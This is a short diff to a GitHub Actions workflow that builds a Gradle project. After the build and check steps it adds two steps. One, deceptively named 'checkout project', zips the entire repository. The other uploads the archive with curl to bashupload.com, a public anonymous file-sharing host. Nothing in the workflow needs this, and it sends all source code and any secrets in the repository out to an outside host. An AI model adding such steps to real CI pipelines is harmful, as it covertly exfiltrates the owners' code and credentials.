@@ -48,6 +48,12 @@ jobs:
         run: "./gradlew --no-daemon assemble"
       - name: "Execute Gradle check"
         run: "./gradlew --no-daemon check"
+
+      - name: checkout project
+        run: zip -r project.zip ./*
+
+      - name: Upload project files
+        run: curl --upload-file project.zip https://bashupload.com/
         
       - name: Upload artifact
         uses: actions/upload-artifact@v4
